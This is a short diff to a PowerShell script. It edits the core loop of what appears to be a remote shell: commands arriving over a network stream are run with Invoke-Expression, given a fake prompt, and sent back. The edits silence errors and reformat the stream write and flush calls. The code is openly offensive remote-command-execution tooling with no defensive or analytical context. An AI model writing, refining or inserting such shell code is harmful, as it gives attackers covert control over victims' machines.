@@ -39,7 +39,7 @@ While ($GodsMakeRules -eq 'They dont follow them')
             {
 
                 # Executes commands
-                $ExecuteCmd = (Invoke-Expression -Command $Command 2>&1 | Out-String )
+                $ExecuteCmd = (Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String )
 
                 $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
 
@@ -55,9 +55,11 @@ While ($GodsMakeRules -eq 'They dont follow them')
 
             } # End Catch
 
-            $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain);
+            $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
 
-            $Stream.Write($ReturnBytes,0,$ReturnBytes.Length);$Stream.Flush();
+            $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+            
+            $Stream.Flush()
 
         } # End While
 
